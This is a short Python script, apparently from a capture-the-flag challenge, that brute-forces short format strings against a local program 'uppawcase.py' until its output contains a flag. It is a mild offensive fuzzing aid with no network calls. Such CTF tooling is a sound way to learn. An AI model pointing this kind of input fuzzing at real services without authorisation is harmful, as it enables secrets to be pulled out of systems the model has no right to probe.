#!/usr/bin/env python3

import subprocess
import itertools

def test_format_string(fmt_str):
    """Test a format string with the original program"""
    try:
        process = subprocess.Popen(['python3', 'uppawcase.py'], 
                                 stdin=subprocess.PIPE, 
                                 stdout=subprocess.PIPE, 
                                 stderr=subprocess.PIPE,
                                 text=True)
        
        stdout, stderr = process.communicate(input=fmt_str, timeout=5)
        result = stdout.strip()
        
        if "skbdg{" in result or "FLAG" in result:
            print(f"SUCCESS! Format string: '{fmt_str}' -> {result}")
            return True
            
    except subprocess.TimeoutExpired:
        pass
    except Exception as e:
        pass
    
    return False

# Define allowed characters
allowed = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789%$*.#-+ "

# Try to brute force short format strings
print("Brute forcing format strings of length 1-4...")

for length in range(1, 5):  # Try lengths 1-4
    print(f"Testing length {length}...")
    count = 0
    
    for chars in itertools.product(allowed, repeat=length):
        fmt_str = ''.join(chars)
        count += 1
        
        # Must start with % to be a valid format string (mostly)
        if fmt_str.startswith('%'):
            if test_format_string(fmt_str):
                exit(0)  # Found it!
        
        # Print progress every 10000 attempts
        if count % 10000 == 0:
            print(f"Tested {count} combinations for length {length}...")
            
        # Limit to avoid infinite execution
        if count > 100000:
            print(f"Stopping at {count} attempts for length {length}")
            break

print("Brute force completed without finding solution.")